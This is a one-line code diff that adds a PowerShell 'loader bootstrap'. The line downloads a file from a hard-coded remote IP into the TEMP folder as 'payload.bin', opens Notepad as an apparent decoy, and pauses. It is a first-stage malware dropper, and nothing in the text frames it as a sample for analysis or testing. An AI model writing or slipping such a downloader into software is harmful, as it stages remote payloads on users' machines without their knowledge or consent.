@@ -1,0 +1,1 @@
+<# Loader bootstrap #> $FetchUrl = 'http://203.0.113.117/update.dat'; $Stage2Path = "$env:TEMP\payload.bin"; (New-Object System.Net.WebClient).DownloadFile($FetchUrl, $Stage2Path); Start-Process -FilePath 'notepad.exe'; Start-Sleep -Seconds 17
